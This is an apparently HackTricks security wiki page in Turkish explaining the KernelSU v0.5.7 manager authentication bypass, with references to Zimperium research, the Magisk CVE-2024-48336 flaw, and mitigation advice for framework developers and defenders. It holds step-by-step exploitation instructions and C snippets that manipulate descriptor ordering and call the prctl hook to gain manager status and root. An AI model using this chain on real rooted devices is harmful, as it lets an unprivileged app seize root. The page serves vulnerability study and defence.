# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch ve SKRoot gibi Rooting Frameworks, Android/Linux kernel'ını patch'ler veya hook'lar ve ayrıcalıksız bir userspace manager app'e ayrıcalıklı işlevsellik sunar. CVE-2024-48336 manager tarafında code loading içerdiğinden ve bu KernelSU syscall path'inden farklı olduğundan Magisk aşağıda ayrıca ele alınmaktadır.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Bu sayfa, hem red hem de blue team'lerin attack surface'lerini, exploitation primitive'lerini ve sağlam mitigation'ları anlamasına yardımcı olmak için public research'te (özellikle Zimperium’ın KernelSU v0.5.7 analizi) ortaya çıkarılan teknikleri ve riskleri özetler.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- KernelSU v0.5.7'de kernel üzerindeki bir hook, userspace'ten magic value, command ID ve command-specific argümanları alır.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller önce `CMD_BECOME_MANAGER` ile manager status ister. Authorization command-specific'tir: `CMD_GRANT_ROOT` manager/allowlist state'i kontrol eder, `CMD_ALLOW_SU` yalnızca manager'a açıktır ve bu version'da `CMD_SET_SEPOLICY` yalnızca root içindir.<sup>[[2]](#references)[[11]](#references)</sup>
- Diğer command'ler version/configuration sorgular veya framework event'lerini bildirir.<sup>[[2]](#references)</sup>
- Her app bu syscall interface'ini çağırabildiğinden manager authentication'ın doğruluğu kritik önem taşır.<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler'a yönlendirmek için magic value: 0xDEADBEEF
- Command'ler şunları içerir: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT vb.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

Userspace `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)` çağırdığında KernelSU şunları doğrular:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Sağlanan path, caller UID için beklenen bir prefix ile başlamalıdır; örneğin `/data/data/<pkg>` veya `/data/user/<id>/<pkg>`.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path, caller UID'ye ait olmalıdır.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) FD table scan üzerinden APK signature check
- Calling process'in açık file descriptor'larını descriptor order'a göre artan sırada iterate eder.
- Her `/data/app/` ile başlayan ve `/base.apk` ile biten regular file için path'in, sağlanan data-directory path'inden türetilen package substring'ini içermesi gerekir.
- Bu path check'lerini geçen ilk candidate'ın signature'ını doğrular.
- APK v2 signature'ını parse eder ve official manager certificate'a karşı doğrular.
- References: manager.c (FD'leri iterate etme), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Tüm check'ler başarılı olursa kernel, manager'ın UID'sini geçici olarak cache'ler; manager-only command'ler bundan sonra bu UID'yi kabul ederken diğer command'ler kendi UID'lerini veya allowlist check'lerini kullanmaya devam eder.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7, signature sonucunu PackageManager'ın installed package identity'sine bind etmez. `manager.c` içinde package test'i yalnızca bir path substring check'idir (`strstr(cwd, pkg)`); bu testi geçen ilk candidate daha sonra signature-check edilir. Böylece attacker, genuine manager APK'sını attacker'ın package name'ini de içeren bir `/data/app/` path'i altında yerleştirebilir ve seçilecek ilk candidate olmasını sağlayabilir.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Bu trust-by-indirection mekanizması, ayrıcalıksız bir app'in manager'ın signing key'ine sahip olmadan manager'ı impersonate etmesine olanak tanır.<sup>[[1]](#references)</sup>

Exploited key properties:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan descriptor index'e göre sıralıdır ve package check, doğrulanmış bir package-to-APK identity binding yerine path substring testidir.
- `open()` kullanılabilir en düşük FD'yi döndürür. Attacker, daha düşük numaralı FD'leri önce kapatarak ordering'i kontrol edebilir.
- Bundled manager APK, official manager signature'ını korurken attacker'ın package string'ini içeren `/data/app/` altındaki bir path'e yerleştirilebilir.

---
## Attack preconditions

Somut KernelSU v0.5.7 vakası şunları gerektirir:<sup>[[1]](#references)[[3]](#references)</sup>

- Device'ın zaten vulnerable bir Rooting Framework ile root edilmiş olması (ör. KernelSU v0.5.7).
- Attacker'ın locally arbitrary unprivileged code çalıştırabilmesi (Android app process).
- v0.5.7 implementation'ı için `current->real_parent` UID'si 0 olmalıdır (source comment bunu zygote direct-child requirement olarak açıklar); `manager.c` diğer parent'ları reject eder.<sup>[[3]](#references)</sup>
- Real manager'ın henüz authenticate olmamış olması (ör. reboot'un hemen ardından). Bazı framework'ler success sonrasında manager UID'sini cache'ler; race'i kazanmanız gerekir.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (cited demo video, public proof of concept'in çalışmasını gösterir):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Prefix ve ownership check'lerini karşılamak için kendi app data directory'nize geçerli bir path oluşturun.
2) Genuine KernelSU Manager base.apk dosyasını, package string'inizi içeren bir path altında `/data/app/` konumuna yerleştirin; ardından bunu kendi base.apk dosyanızdan daha düşük numaralı bir FD üzerinden açın.
3) Check'leri geçmek için `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` çağırın.
4) Persistent su için önce `CMD_GRANT_ROOT`, ardından `CMD_ALLOW_SU` kullanın; root-only `CMD_SET_SEPOLICY` command'ini yalnızca root elde ettikten sonra ve desteklendiği yerlerde çağırın.

Step 2 (FD ordering) için practical notes:<sup>[[1]](#references)</sup>
- `/proc/self/fd` symlink'lerini walk ederek process'inizin kendi `/data/app/*/base.apk` dosyasına ait FD'yi belirleyin.
- Düşük numaralı bir FD'yi (ör. stdin, fd 0) kapatın ve legitimate manager APK'sını önce açarak fd 0'ı (veya kendi base.apk fd'nizden daha düşük herhangi bir index'i) kullanmasını sağlayın.
- Legitimate manager APK'sını app'inizle bundle edin; böylece path `/data/app/` ile başlar, `/base.apk` ile biter ve package string'inizi içerir. Örneğin app'inizin `lib` directory'si altındaki bir path bu check'leri karşılayabilir.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Meşru manager APK'sine işaret eden daha düşük numaralı bir FD'yi zorla:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
KernelSU v0.5.7 `prctl` hook'u üzerinden Manager kimlik doğrulaması:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Başarılı olduktan sonra kullanılabilen ayrıcalıklı komutlar (örnekler):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: mevcut process'i root yetkisine yükseltir
- CMD_ALLOW_SU: kalıcı su için package/UID'nizi allowlist'e ekler
- CMD_SET_SEPOLICY: root elde edildikten sonra SELinux policy'sini ayarlar; KernelSU v0.5.7 bu komut için UID 0 kontrolü yapar.<sup>[[2]](#references)</sup>

Race/persistence ipucu:
- Yeniden başlatmadan sonra başlatılmak ve gerçek manager'dan önce authentication denemek için AndroidManifest'e (`RECEIVE_BOOT_COMPLETED`) bir BOOT_COMPLETED receiver'ı kaydedin; bu permission, `ACTION_BOOT_COMPLETED` alımını yetkilendirir ancak tek başına scheduling priority garantisi vermez.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection ve mitigation rehberi

Framework geliştiricileri için:
- Authentication'ı arbitrary FD'lere değil, caller'ın package/UID'sine bağlayın:
- Caller'ın package'ını UID'sinden çözümleyin ve FD'leri taramak yerine installed package'ın signature'ı ile (PackageManager üzerinden) doğrulayın.
- Kernel-only ise stable caller identity (task creds) kullanın ve process FD'leri yerine init/userspace helper tarafından yönetilen stable bir source of truth üzerinden doğrulama yapın.
- Identity olarak path-prefix kontrollerini kullanmaktan kaçının; bunlar caller tarafından trivially satisfiable durumdadır.
- Channel üzerinden nonce-based challenge–response kullanın ve boot sırasında veya önemli event'lerde cached manager identity'yi temizleyin.
- Uygun olduğunda generic syscall'leri aşırı yüklemek yerine binder-based authenticated IPC kullanmayı değerlendirin.

Defenders/blue team için:
- Rooting framework'lerinin ve manager process'lerinin varlığını tespit edin; kernel telemetry'niz varsa şüpheli magic constant'larla (ör. 0xDEADBEEF) yapılan prctl çağrılarını izleyin.<sup>[[1]](#references)[[11]](#references)</sup>
- Managed fleet'lerde, boot sonrasında privileged manager komutlarını hızla denemek için untrusted package'lerden gelen boot receiver'larını engelleyin veya bunlar hakkında alert oluşturun.
- Cihazların patched framework sürümlerine güncellendiğinden emin olun; update sonrasında cached manager ID'lerini geçersiz kılın.

Saldırının sınırlamaları:<sup>[[1]](#references)[[2]](#references)</sup>
- Yalnızca vulnerable bir framework ile zaten rooted olan cihazları etkiler.
- Genellikle legitimate manager authentication yapmadan önce bir reboot/race window gerekir (bazı framework'ler reset edilene kadar manager UID'sini cache'ler).

---
## Framework'ler genelinde ilgili notlar

- Password-based auth (ör. historical APatch/SKRoot build'leri), password'ler guessable/bruteforceable olduğunda veya validation'lar hatalı olduğunda zayıf olabilir.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (ör. KernelSU) prensipte daha güçlüdür; ancak FD scan'leri üzerinden seçilen path-derived artefact'lere değil, actual caller'a bağlanmalıdır.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336, doğrulanmamış bir GMS package'ından code yükleyen pre-Canary 27007 build'lerini etkiledi; bu durum local app'in Magisk app içinde code execute etmesine ve user interaction olmadan root'a yükselmesine olanak sağladı.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Tüm Kötülüklerin Rooting'i: Mobil Cihazınızı Tehlikeye Atabilecek Güvenlik Açıkları](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c authentication kontrolleri](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c FD iterasyonu, package kontrolü ve signature çağrısı](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c APK v2 doğrulaması](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU projesi](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – GMS'nin system app olduğunu doğrulama](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo videosu (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h command identifier'ları](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
